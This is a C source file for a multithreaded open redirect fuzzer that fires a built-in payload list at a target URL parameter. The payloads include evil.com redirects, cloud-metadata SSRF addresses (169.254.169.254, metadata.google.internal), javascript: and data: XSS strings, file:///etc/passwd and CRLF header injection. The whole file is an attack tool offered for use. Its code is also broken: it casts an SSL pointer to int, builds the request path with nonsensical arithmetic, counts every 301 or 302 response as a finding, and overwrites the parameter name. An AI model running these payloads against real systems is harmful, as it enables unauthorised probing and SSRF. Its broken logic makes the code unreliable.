// openredirect.c - Ultra-fast Open Redirect Fuzzer in C (2025)
// Compile:
//   Linux/macOS: gcc -O3 -o openredirect openredirect.c -lssl -lcrypto -lpthread
//   Windows:     x86_64-w64-mingw32-gcc -O3 -o openredirect.exe openredirect.c -lssl -lcrypto -lpthread
// Usage:
//   ./openredirect https://target.com/redirect?url=
//   ./openredirect http://intranet.local/login.php?return=

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <netdb.h>

#define THREADS 64
SSL_CTX *ctx = NULL;

const char *payloads[] = {
    "https://evil.com",
    "https://google.com",
    "//evil.com",
    "//google.com",
    "///evil.com",
    "////evil.com",
    "/%09/evil.com",
    "/%5cevil.com",
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "//169.254.169.254/latest/meta-data/",
    "http://0000::1",
    "file:///etc/passwd",
    "http://evil.com%23@google.com",
    "http://google.com%23@evil.com",
    "https://evil.com%0a%0dheader: evil",
    "https://evil.com/?@google.com/",
    "https://evil.com#@google.com/",
    "https://google.com/.evil.com",
    "https://google.com\\evil.com",
    "https://evil.com/.google.com",
    NULL
};

char base_url[1024];
char param_name[128] = "url";
int found = 0;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

int connect_ssl(const char *host, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct hostent *server = gethostbyname(host);
    if (!server) { close(sock); return -1; }

    struct sockaddr_in serv_addr = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sock);
        return -1;
    }

    if (port == 443) {
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        if (SSL_connect(ssl) <= 0) {
            SSL_free(ssl);
            close(sock);
            return -1;
        }
        return (int)ssl;
    }
    return sock;
}

void send_request(int conn, int is_ssl, const char *payload) {
    char request[2048];
    char host[256];
    int port = strstr(base_url, "https://") ? 443 : 80;
    sscanf(base_url, "%*[^/]//%255[^:/]", host);

    snprintf(request, sizeof(request),
        "GET %s%s=%s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: openredirect/2025\r\n"
        "Connection: close\r\n"
        "\r\n", base_url + strlen(host) + strlen(strstr(base_url, "://")), param_name, payload, host);

    if (is_ssl) SSL_write((SSL*)conn, request, strlen(request));
    else write(conn, request, strlen(request));
}

int check_vuln(int conn, int is_ssl) {
    char buf[8192] = {0};
    int n = is_ssl ? SSL_read((SSL*)conn, buf, sizeof(buf)-1) : read(conn, buf, sizeof(buf)-1);
    if (n <= 0) return 0;

    buf[n] = 0;
    if (strstr(buf, "Location: http://evil.com") ||
        strstr(buf, "Location: https://evil.com") ||
        strstr(buf, "Location: //evil.com") ||
        strstr(buf, "Location: //google.com") ||
        strstr(buf, "Location: http://169.254.169.254") ||
        strstr(buf, "Location: http://metadata.google.internal") ||
        strstr(buf, "Location: javascript:") ||
        strstr(buf, "Location: data:") ||
        strstr(buf, "301 ") || strstr(buf, "302 ")) {
        return 1;
    }
    return 0;
}

void test_payload(const char *payload) {
    char *url = strdup(base_url);
    char *host = strstr(url, "://") ? strstr(url, "://") + 3 : url;
    char *slash = strchr(host, '/');
    if (slash) *slash = 0;

    int port = strstr(base_url, "https://") ? 443 : 80;
    int conn = connect_ssl(host, port);
    if (conn <= 0) { free(url); return; }

    int is_ssl = (port == 443);
    send_request(conn, is_ssl, payload);

    if (check_vuln(conn, is_ssl)) {
        pthread_mutex_lock(&lock);
        found = 1;
        printf("\033[1;31m[+] OPEN REDIRECT → %s%s=%s\033[0m\n", base_url, param_name, payload);
        if (strstr(payload, "evil.com")) printf("    → Classic open redirect (CRITICAL)\n");
        if (strstr(payload, "169.254.169.254")) printf("    → AWS metadata SSRF possible!\n");
        if (strstr(payload, "javascript:")) printf("    → XSS via open redirect!\n");
        pthread_mutex_unlock(&lock);
    }

    if (is_ssl) { SSL_shutdown((SSL*)conn); SSL_free((SSL*)conn); }
    close(conn);
    free(url);
}

void *worker(void *arg) {
    for (int i = 0; payloads[i]; i++) {
        test_payload(payloads[i]);
        usleep(1000);
    }
    return NULL;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("openredirect – Fast Open Redirect Fuzzer in C (2025)\n");
        printf("Usage:\n");
        printf("  %s https://target.com/redirect?url=\n", argv[0]);
        printf("  %s http://app.local/login.php?return=\n", argv[0]);
        return 1;
    }

    SSL_library_init();
    ctx = SSL_CTX_new(TLS_client_method());

    strcpy(base_url, argv[1]);
    char *q = strstr(base_url, "?");
    if (q) {
        *q = 0;
        sscanf(q + 1, "%[^=]=", param_name);
    }
    if (!strstr(base_url, "?")) {
        strcat(base_url, "?x=");
        strcpy(param_name, "x");
    }

    printf("[*] Target: %s | Parameter: %s | Threads: %d\n", base_url, param_name, THREADS);

    pthread_t th[THREADS];
    for (int i = 0; i < THREADS; i++) {
        pthread_create(&th[i], NULL, worker, NULL);
    }
    for (int i = 0; i < THREADS; i++) pthread_join(th[i], NULL);

    if (!found) printf("\033[1;32m[-] No open redirects found\033[0m\n");

    SSL_CTX_free(ctx);
    return 0;
}
